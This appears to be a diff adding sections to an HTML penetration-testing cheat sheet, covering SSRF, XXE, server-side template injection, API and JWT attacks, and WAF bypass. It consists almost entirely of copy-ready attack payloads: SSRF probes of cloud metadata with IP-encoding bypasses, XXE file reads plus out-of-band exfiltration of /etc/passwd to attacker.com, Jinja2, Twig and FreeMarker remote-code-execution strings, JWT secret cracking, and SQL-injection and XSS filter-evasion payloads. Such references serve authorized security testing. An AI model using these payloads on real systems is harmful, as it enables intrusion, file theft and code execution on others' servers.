@@ -312,9 +312,166 @@ https://target.com/uploads/shell.php?cmd=ls+-la</pre>
       </div>
     </div>
 
+    <!-- SSRF -->
+    <div class="cs-section" id="ssrf">
+      <h2 class="cs-section-title"><span class="sec-icon">🌐</span> SSRF</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">SSRF Testing</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Basic internal access</span>
+curl "http://target.com/fetch?url=http://127.0.0.1/"
+curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
+
+<span class="cm"># Port scanning via SSRF</span>
+ffuf -w ports.txt -u "http://target.com/fetch?url=http://127.0.0.1:FUZZ/" -fc 200
+
+<span class="cm"># Protocol tricks</span>
+file:///etc/passwd
+dict://127.0.0.1:6379/info
+gopher://127.0.0.1:6379/_INFO
+
+<span class="cm"># Filter bypass</span>
+http://2130706433/         # 127.0.0.1 as decimal
+http://0x7f000001/         # 127.0.0.1 as hex
+http://127.1/              # Short form
+http://[::1]/              # IPv6 loopback</pre>
+      </div>
+    </div>
+
+    <!-- XXE -->
+    <div class="cs-section" id="xxe">
+      <h2 class="cs-section-title"><span class="sec-icon">📄</span> XXE Injection</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">XXE Payloads</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Classic file read</span>
+<span class="str">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</span>
+
+<span class="cm"># PHP source via wrapper</span>
+<span class="str">&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php"&gt;</span>
+
+<span class="cm"># Out-of-band (OOB) exfil</span>
+<span class="str">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % exfil "&lt;!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'&gt;"&gt;</span>
+
+<span class="cm"># Automated tool</span>
+python3 XXEinjector.py --host=attacker.com --path=/etc/passwd --file=request.txt</pre>
+      </div>
+    </div>
+
+    <!-- SSTI -->
+    <div class="cs-section" id="ssti">
+      <h2 class="cs-section-title"><span class="sec-icon">🧩</span> SSTI</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Template Injection Detection &amp; Exploit</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Detection probes</span>
+{{7*7}}          <span class="cm"># Jinja2 / Twig → 49</span>
+${7*7}           <span class="cm"># FreeMarker / Smarty → 49</span>
+<%= 7*7 %>       <span class="cm"># ERB (Ruby) → 49</span>
+#{7*7}           <span class="cm"># Ruby interpolation</span>
+
+<span class="cm"># Jinja2 RCE (Python)</span>
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+<span class="cm"># Twig RCE (PHP)</span>
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+<span class="cm"># FreeMarker RCE (Java)</span>
+${"freemarker.template.utility.Execute"?new()("id")}</pre>
+      </div>
+    </div>
+
+    <!-- API Testing -->
+    <div class="cs-section" id="api">
+      <h2 class="cs-section-title"><span class="sec-icon">🔌</span> API Testing</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">REST &amp; GraphQL Recon</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Discover API endpoints</span>
+ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://target.com/FUZZ
+
+<span class="cm"># Swagger / OpenAPI discovery</span>
+curl http://target.com/swagger.json
+curl http://target.com/api/v1/docs
+curl http://target.com/openapi.yaml
+
+<span class="cm"># GraphQL introspection</span>
+curl -X POST http://target.com/graphql -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name}}}"}'
+
+<span class="cm"># gRPC enumeration</span>
+grpcurl -plaintext target.com:50051 list
+grpcurl -plaintext target.com:50051 describe ServiceName
+
+<span class="cm"># ffuf parameter fuzzing</span>
+ffuf -w params.txt -u "http://target.com/api/v1/user?FUZZ=test" -fw 1</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">JWT Attacks</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Decode JWT (no verification)</span>
+echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+
+<span class="cm"># None algorithm attack</span>
+<span class="cm"># Change alg to "none", remove signature, send with trailing dot</span>
+
+<span class="cm"># Crack HS256 secret</span>
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+<span class="cm"># jwt_tool — Swiss army knife</span>
+python3 jwt_tool.py <TOKEN> -T       <span class="cm"># tamper mode</span>
+python3 jwt_tool.py <TOKEN> -C -d wordlist.txt  <span class="cm"># crack</span></pre>
+      </div>
+    </div>
+
+    <!-- WAF Bypass -->
+    <div class="cs-section" id="waf">
+      <h2 class="cs-section-title"><span class="sec-icon">🛡️</span> WAF Detection &amp; Bypass</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">WAF Fingerprint &amp; Evasion</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Detect WAF</span>
+wafw00f http://target.com
+
+<span class="cm"># Common bypass headers</span>
+X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+
+<span class="cm"># SQLi WAF bypass</span>
+'/**/OR/**/1=1--
+'%09OR%091=1--         <span class="cm"># tab instead of space</span>
+'/*!OR*/1=1--          <span class="cm"># MySQL comment trick</span>
+'%0aOR%0a1=1--         <span class="cm"># newline</span>
+
+<span class="cm"># XSS WAF bypass</span>
+<span class="str">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span>
+<span class="str">&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="str">&lt;details open ontoggle=alert(1)&gt;</span></pre>
+      </div>
+    </div>
+
   </main>
 </div>
 
 <script src="../cs.js"></script>
 </body>
 </html>
+
